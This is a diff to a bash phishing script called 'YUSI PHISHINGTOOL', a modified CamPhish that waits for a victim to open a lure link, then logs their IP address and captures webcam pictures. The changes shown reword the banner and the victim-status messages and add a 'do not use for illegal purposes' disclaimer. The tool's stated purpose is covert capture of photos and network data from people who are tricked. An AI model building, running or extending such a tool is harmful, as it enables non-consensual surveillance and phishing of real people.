@@ -8,6 +8,8 @@ clear
 printf "\e[1;92m YUSI\e[0m\e[1;77m PHISHINGTOOL \e[0m\n"
 printf " \e[1;93m Yusi Version1 \e[0m \n"
 printf " \e[1;77m Aounion| https://github.com/aouni0n \e[0m \n"
+printf " \e[1;77m !!!PLEASE DO NOT USE THIS TOOL FOR ILLEGAL PURPOSES!!! \e[0m \n"
+printf " \e[1;77m This tool is a modified version of CAMPHISH by TechChip, Go check it out https://github.com/techchipnet/CamPhish \e[0m \n"
 
 printf "\n"
 
@@ -51,12 +53,12 @@ cat ip.txt >> saved.ip.txt
 checkfound() {
 
 printf "\n"
-printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting For Brain Dead Yusis To Open Link ;),\e[0m\e[1;77m Press Ctrl + C to exit...\e[0m\n"
+printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting For The Victim To Open Link ;),\e[0m\e[1;77m Press Ctrl + C to exit...\e[0m\n"
 while [ true ]; do
 
 
 if [[ -e "ip.txt" ]]; then
-printf "\n\e[1;92m[\e[0m+\e[1;92m] LMAO he opened the link!\n"
+printf "\n\e[1;92m[\e[0m+\e[1;92m] DAMN!!! They opened the link!\n"
 catch_ip
 rm -rf ip.txt
 
@@ -65,7 +67,7 @@ fi
 sleep 0.5
 
 if [[ -e "Log.log" ]]; then
-printf "\n\e[1;92m[\e[0m+\e[1;92m] Jatuk Pakra Gaya We Got A Picture!  Press Ctrl + C to exit...   \e[0m\n"
+printf "\n\e[1;92m[\e[0m+\e[1;92m] We Got A Picture!  Press Ctrl + C to exit...   \e[0m\n"
 rm -rf Log.log
 fi
 sleep 0.5
